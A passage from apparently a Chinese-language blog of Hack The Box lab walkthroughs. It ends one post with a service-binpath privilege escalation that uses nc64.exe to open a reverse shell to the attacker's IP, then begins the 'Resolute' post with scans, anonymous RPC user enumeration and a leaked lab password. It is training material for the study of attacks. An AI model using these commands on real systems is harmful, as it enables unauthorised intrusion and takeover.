class="hljs-number">2000</span> Compatible Access Alias            S<span class="hljs-literal">-1-5-32-554</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NETWORK                       Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-2</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\Authenticated Users           Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-11</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\This Organization             Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-15</span>     Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>NT AUTHORITY\NTLM Authentication           Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-5-64-10</span>  Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>Mandatory Label\High Mandatory Level       Label            S<span class="hljs-literal">-1-16-12288</span><br></code></pre></td></tr></table></figure><p>创建个恶意服务就可以轻松获取系统权限：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Documents&gt; <span class="hljs-built_in">CD</span> C:\programdata<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/n<br>/home/mosaictheory/Tools/nc               /home/mosaictheory/Tools/nmapscripts.list<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/nc/nc<br>/home/mosaictheory/Tools/nc/nc.exe   /home/mosaictheory/Tools/nc/nc64.exe<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; upload /home/mosaictheory/Tools/nc/nc64.exe<br>Info: Uploading /home/mosaictheory/Tools/nc/nc64.exe to C:\programdata\nc64.exe<br>                                                             <br><span class="hljs-keyword">Data</span>: <span class="hljs-number">60360</span> bytes of <span class="hljs-number">60360</span> bytes copied<br><br>Info: Upload successful!<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; sc.exe config VSS binpath=<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.16.6 9001&quot;</span><br>[<span class="hljs-type">SC</span>] ChangeServiceConfig SUCCESS<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\programdata&gt; sc.exe <span class="hljs-built_in">start</span> VSS<br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt;<span class="hljs-title">cd</span> <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"><span class="hljs-title">cd</span> <span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function"><span class="hljs-title">type</span> <span class="hljs-title">root.txt</span></span><br><span class="hljs-function">4<span class="hljs-title">f6</span>....................................</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Resolute</title>
    <link href="/post/HackTheBox-Resolute.html"/>
    <url>/post/HackTheBox-Resolute.html</url>
    
    <content type="html"><![CDATA[<p>Don’t let your future self hate your present self.</p><p>不要让未来的你，讨厌现在的自己。</p><h4 id="Hack-The-Box-Resolute"><a href="#Hack-The-Box-Resolute" class="headerlink" title="Hack The Box - Resolute"></a>Hack The Box - Resolute</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Nmap 7.92 scan initiated Sat Apr 23 17:10:45 2022 as: nmap -sC -sV -T4 -Pn -p- -oA nmap.txt 10.10.10.169</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.48s</span> <span class="hljs-string">latency).</span><br><span class="hljs-attr">Not shown:</span> <span class="hljs-number">65512</span> <span class="hljs-string">closed</span> <span class="hljs-string">tcp</span> <span class="hljs-string">ports</span> <span class="hljs-string">(reset)</span><br><span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span><br><span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2022-04-23 09:32:06Z</span><span class="hljs-string">)</span><br><span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">MEGABANK)</span><br><span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span><br><span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">megabank.local,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span><br><span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>       <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span><br><span class="hljs-number">47001</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span><br><span class="hljs-number">49664</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49665</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49666</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49667</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49671</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49674</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span><br><span class="hljs-number">49675</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49680</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">49712</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>        <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span><br><span class="hljs-number">50105</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">tcpwrapped</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">RESOLUTE;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">2h26m59s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">4h02m30s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">6m59s</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-time:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">date:</span> <span class="hljs-number">2022-04-23T09:33:06</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">start_date:</span> <span class="hljs-number">2022-04-23T09:16:10</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb2-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">3.1.1:</span> <br><span class="hljs-string">|_</span>    <span class="hljs-string">Message</span> <span class="hljs-string">signing</span> <span class="hljs-string">enabled</span> <span class="hljs-string">and</span> <span class="hljs-string">required</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">14393</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">Server</span> <span class="hljs-number">2016 </span><span class="hljs-string">Standard</span> <span class="hljs-number">6.3</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">Resolute</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">RESOLUTE\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Domain name:</span> <span class="hljs-string">megabank.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Forest name:</span> <span class="hljs-string">megabank.local</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">FQDN:</span> <span class="hljs-string">Resolute.megabank.local</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2022-04-23T02:33:02-07:00</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">&lt;blank&gt;</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">required</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-comment"># Nmap done at Sat Apr 23 17:26:25 2022 -- 1 IP address (1 host up) scanned in 940.01 seconds</span><br></code></pre></td></tr></table></figure><h5 id="DNS协议："><a href="#DNS协议：" class="headerlink" title="DNS协议："></a>DNS协议：</h5><p>Nmap为我枚举出了megabank.local，但是按惯例来讲目标应该还存有resolute.local，我可以试试：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ <span class="hljs-keyword">dig </span>@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">169</span> megabank.local       <br><br><span class="hljs-comment">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.10.10.169 megabank.local</span><br><span class="hljs-comment">; (1 server found)</span><br><span class="hljs-comment">;; global options: +cmd</span><br><span class="hljs-comment">;; Got answer:</span><br><span class="hljs-comment">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="hljs-comment">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="hljs-comment">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 20763</span><br><span class="hljs-comment">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><br><span class="hljs-comment">;; OPT PSEUDOSECTION:</span><br><span class="hljs-comment">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-comment">;; QUESTION SECTION:</span><br><span class="hljs-comment">;megabank.local.                        IN      A</span><br><br><span class="hljs-comment">;; ANSWER SECTION:</span><br>megabank.local.         <span class="hljs-number">600</span>     IN      A       <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">169</span><br><br><span class="hljs-comment">;; Query time: 187 msec</span><br><span class="hljs-comment">;; SERVER: 10.10.10.169#53(10.10.10.169) (UDP)</span><br><span class="hljs-comment">;; WHEN: Sat Apr 23 17:31:30 CST 2022</span><br><span class="hljs-comment">;; MSG SIZE  rcvd: 59</span><br></code></pre></td></tr></table></figure><p>但是我错了：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ dig @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> resolute.<span class="hljs-keyword">local</span><br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span>-Debian &lt;&lt;&gt;&gt; @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> resolute.<span class="hljs-keyword">local</span><br>; (<span class="hljs-number">1</span> <span class="hljs-keyword">server</span> <span class="hljs-built_in">found</span>)<br>;; <span class="hljs-keyword">global</span> <span class="hljs-keyword">options</span>: +cmd<br>;; <span class="hljs-keyword">connection</span> timed <span class="hljs-keyword">out</span>; <span class="hljs-keyword">no</span> servers could be reached<br></code></pre></td></tr></table></figure><p>他并没有该域，看来这次或许会反常一点。我还是会尝试区域传输，尽管它从来没成功过：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ dig axfr @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> megabank.<span class="hljs-keyword">local</span>  <br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span>-Debian &lt;&lt;&gt;&gt; axfr @<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> megabank.<span class="hljs-keyword">local</span><br>; (<span class="hljs-number">1</span> <span class="hljs-keyword">server</span> <span class="hljs-built_in">found</span>)<br>;; <span class="hljs-keyword">global</span> <span class="hljs-keyword">options</span>: +cmd<br>; Transfer failed.<br></code></pre></td></tr></table></figure><h5 id="RCP端口："><a href="#RCP端口：" class="headerlink" title="RCP端口："></a>RCP端口：</h5><p>RPC端口即使现在我依然觉得它很神秘，哪怕现在我也只知道它能用来做哪些，但我还是无法预估它具体能用来做哪些，做多少。我可以尝试匿名链接：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N <span class="hljs-number">10.10</span>.<span class="hljs-number">10.169</span><br>rpcclient <span class="hljs-variable">$&gt;</span> <br></code></pre></td></tr></table></figure><p>看起来它允许我匿名访问，那么我可以尝试枚举目标一些信息：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs inform7">rpcclient $&gt; enumdomusers<br>user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span><br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span><br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span><br>user:<span class="hljs-comment">[DefaultAccount]</span> rid:<span class="hljs-comment">[0x1f7]</span><br>user:<span class="hljs-comment">[ryan]</span> rid:<span class="hljs-comment">[0x451]</span><br>user:<span class="hljs-comment">[marko]</span> rid:<span class="hljs-comment">[0x457]</span><br>user:<span class="hljs-comment">[sunita]</span> rid:<span class="hljs-comment">[0x19c9]</span><br>user:<span class="hljs-comment">[abigail]</span> rid:<span class="hljs-comment">[0x19ca]</span><br>user:<span class="hljs-comment">[marcus]</span> rid:<span class="hljs-comment">[0x19cb]</span><br>user:<span class="hljs-comment">[sally]</span> rid:<span class="hljs-comment">[0x19cc]</span><br>user:<span class="hljs-comment">[fred]</span> rid:<span class="hljs-comment">[0x19cd]</span><br>user:<span class="hljs-comment">[angela]</span> rid:<span class="hljs-comment">[0x19ce]</span><br>user:<span class="hljs-comment">[felicia]</span> rid:<span class="hljs-comment">[0x19cf]</span><br>user:<span class="hljs-comment">[gustavo]</span> rid:<span class="hljs-comment">[0x19d0]</span><br>user:<span class="hljs-comment">[ulf]</span> rid:<span class="hljs-comment">[0x19d1]</span><br>user:<span class="hljs-comment">[stevie]</span> rid:<span class="hljs-comment">[0x19d2]</span><br>user:<span class="hljs-comment">[claire]</span> rid:<span class="hljs-comment">[0x19d3]</span><br>user:<span class="hljs-comment">[paulo]</span> rid:<span class="hljs-comment">[0x19d4]</span><br>user:<span class="hljs-comment">[steve]</span> rid:<span class="hljs-comment">[0x19d5]</span><br>user:<span class="hljs-comment">[annette]</span> rid:<span class="hljs-comment">[0x19d6]</span><br>user:<span class="hljs-comment">[annika]</span> rid:<span class="hljs-comment">[0x19d7]</span><br>user:<span class="hljs-comment">[per]</span> rid:<span class="hljs-comment">[0x19d8]</span><br>user:<span class="hljs-comment">[claude]</span> rid:<span class="hljs-comment">[0x19d9]</span><br>user:<span class="hljs-comment">[melanie]</span> rid:<span class="hljs-comment">[0x2775]</span><br>user:<span class="hljs-comment">[zach]</span> rid:<span class="hljs-comment">[0x2776]</span><br>user:<span class="hljs-comment">[simon]</span> rid:<span class="hljs-comment">[0x2777]</span><br>user:<span class="hljs-comment">[naoki]</span> rid:<span class="hljs-comment">[0x2778]</span><br></code></pre></td></tr></table></figure><p>就这样我获取到了一些用户名，可以用来去枚举kerberos协议用户名，但是如果我想知道用户更多的信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpcclient</span> $&gt; querydispinfo<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b0 RID: <span class="hljs-number">0</span>x19ca acb: <span class="hljs-number">0</span>x00000010 Account: abigail      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbc RID: <span class="hljs-number">0</span>x1f4 acb: <span class="hljs-number">0</span>x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b4 RID: <span class="hljs-number">0</span>x19ce acb: <span class="hljs-number">0</span>x00000010 Account: angela       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bc RID: <span class="hljs-number">0</span>x19d6 acb: <span class="hljs-number">0</span>x00000010 Account: annette      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bd RID: <span class="hljs-number">0</span>x19d7 acb: <span class="hljs-number">0</span>x00000010 Account: annika       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b9 RID: <span class="hljs-number">0</span>x19d3 acb: <span class="hljs-number">0</span>x00000010 Account: claire       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10bf RID: <span class="hljs-number">0</span>x19d9 acb: <span class="hljs-number">0</span>x00000010 Account: claude       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbe RID: <span class="hljs-number">0</span>x1f7 acb: <span class="hljs-number">0</span>x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b5 RID: <span class="hljs-number">0</span>x19cf acb: <span class="hljs-number">0</span>x00000010 Account: felicia      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b3 RID: <span class="hljs-number">0</span>x19cd acb: <span class="hljs-number">0</span>x00000010 Account: fred Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xfbd RID: <span class="hljs-number">0</span>x1f5 acb: <span class="hljs-number">0</span>x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b6 RID: <span class="hljs-number">0</span>x19d0 acb: <span class="hljs-number">0</span>x00000010 Account: gustavo      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>xff4 RID: <span class="hljs-number">0</span>x1f6 acb: <span class="hljs-number">0</span>x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10b1 RID: <span class="hljs-number">0</span>x19cb acb: <span class="hljs-number">0</span>x00000010 Account: marcus       Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10a9 RID: <span class="hljs-number">0</span>x457 acb: <span class="hljs-number">0</span>x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c0 RID: <span class="hljs-number">0</span>x2775 acb: <span class="hljs-number">0</span>x00000010 Account: melanie      Name: (null)    Desc: (null)<br><span class="hljs-attribute">index</span>: <span class="hljs-number">0</span>x10c3 